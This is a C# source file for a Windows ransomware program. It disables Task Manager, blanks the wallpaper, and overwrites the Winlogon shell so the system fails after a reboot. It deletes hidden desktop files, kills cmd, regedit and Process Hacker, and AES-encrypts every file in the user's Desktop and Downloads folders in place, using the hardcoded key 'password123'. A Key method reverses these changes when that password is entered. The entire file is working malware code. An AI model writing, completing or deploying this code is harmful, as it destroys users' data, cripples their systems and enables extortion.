using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Ransonware3
{
    class Ransonware
    {
        public void Ransonware3_Load()
        {
            //Disable taskmanager
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            //Remove wallpaper
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
            //If you shutdown your computer, you cant run winodws well
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define for desktop path

            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
            string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file2 in filesPaths)
                File.Delete(file2);
        }

        public void DeleteDesktopIni()
        {
            //tmr_show.Stop();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (path + @"\desktop.ini");
            File.Delete(filepath);

            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder + @"\desktop.ini");
            File.Delete(filedl);
        }
        public void BlockSystem()
        {
            //tmr_if.Stop();
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd")
                {
                    //hWnd = pr.MainWindowHandle.ToInt32();
                    //ShowWindow(hWnd, SW_HIDE);
                    pr.Kill();
                }

                if (pr.ProcessName == "regedit")
                {
                    //hWnd = pr.MainWindowHandle.ToInt32();
                    //ShowWindow(hWnd, SW_HIDE);
                    pr.Kill();
                }

                if (pr.ProcessName == "Processhacker")
                {
                    //hWnd = pr.MainWindowHandle.ToInt32();
                    //ShowWindow(hWnd, SW_HIDE);
                    pr.Kill();
                }

                if (pr.ProcessName == "sdclt")
                {
                    //hWnd = pr.MainWindowHandle.ToInt32();
                    //ShowWindow(hWnd, SW_HIDE);
                    pr.Kill();
                }
            }
            //tmr_if.Start();

        }
        public void CallEncrypt()
        {
            Start_Encrypt();
        }
        public void BlockOS()
        {

        }

        public void Key(string password)
        {
            if (password == "")
            {
                Console.WriteLine("Clave incorrecta...");
            }
            else if (password == "password123")
            {
                Console.WriteLine("Clave correcta...");
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);

                OFF_Encrypt(); //decrypt all encrypt files

                //kill ransomware
                Process[] _process = null;
                _process = Process.GetProcessesByName("Rasomware3");
                foreach (Process proces in _process)
                {
                    proces.Kill();
                }
            }
            else
            {
                Console.WriteLine("Clave incorrecta...");
            }
        }


        #region EncryptSite

        

        
        static void Start_Encrypt() //We see start encrypt files on desktop and download folder
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            EncryptionFile enc = new EncryptionFile();


            string password = "password123"; //your password

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);

            }

            for (int i = 0; i < files2.Length; i++)
            {
                enc.EncryptFile(files2[i], password);

            }
        }
        //codebox
        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }
        
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }
        #endregion

        #region DecryptSite

        static void OFF_Encrypt() //time to descrypt
        {

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);


            DecryptionFile dec = new DecryptionFile();

            string password = "password123";

            for (int i = 0; i < files.Length; i++)
            {
                dec.DecryptFile(files[i], password);
            }

            for (int i = 0; i < files2.Length; i++)
            {
                dec.DecryptFile(files2[i], password);

            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {

                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }

        #endregion
        
    }
}
